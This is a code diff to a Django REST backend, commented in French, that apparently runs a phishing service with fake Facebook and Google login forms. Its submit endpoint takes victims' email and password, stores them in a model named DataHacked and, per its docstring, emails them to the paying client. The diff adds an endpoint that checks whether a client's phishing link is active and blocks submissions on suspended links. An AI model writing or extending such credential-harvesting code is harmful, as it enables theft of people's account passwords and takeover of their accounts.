@@ -101,14 +101,32 @@ class DataHackedDetailView(APIView):
 # FRONT PUBLIC (facebook / google)
 # ─────────────────────────────────────────────
 
+class HackCheckView(APIView):
+    """
+    GET /hack/<token>/check/
+    Vérifie si un token est actif (suspendu ou non).
+    Le front appelle cet endpoint AVANT d'afficher le formulaire.
+    """
+    permission_classes = [AllowAny]
+
+    def get(self, request, token):
+        try:
+            client = ClientHack.objects.get(token=token)
+        except ClientHack.DoesNotExist:
+            return Response({"active": False}, status=status.HTTP_404_NOT_FOUND)
+
+        return Response({"active": client.is_active})
+
+
 class HackSubmitView(APIView):
     """
     POST /hack/<token>/submit/
     Body: { "email": "...", "password": "...", "type": "facebook"|"google" }
 
     1. Vérifie que le token existe
-    2. Enregistre dans DataHacked
-    3. Envoie un mail au client avec email, password, date, heure
+    2. Vérifie que le client est actif
+    3. Enregistre dans DataHacked
+    4. Envoie un mail au client avec email, password, date, heure
     """
     permission_classes = [AllowAny]
 
@@ -118,6 +136,10 @@ class HackSubmitView(APIView):
             client = ClientHack.objects.get(token=token)
         except ClientHack.DoesNotExist:
             return Response({"error": "Lien invalide."}, status=status.HTTP_404_NOT_FOUND)
+
+        # 2. Vérifier si le client est actif
+        if not client.is_active:
+            return Response({"error": "Ce lien n'est plus actif."}, status=status.HTTP_403_FORBIDDEN)
 
         # 2. Valider les données
         serializer = SubmitHackSerializer(data=request.data)
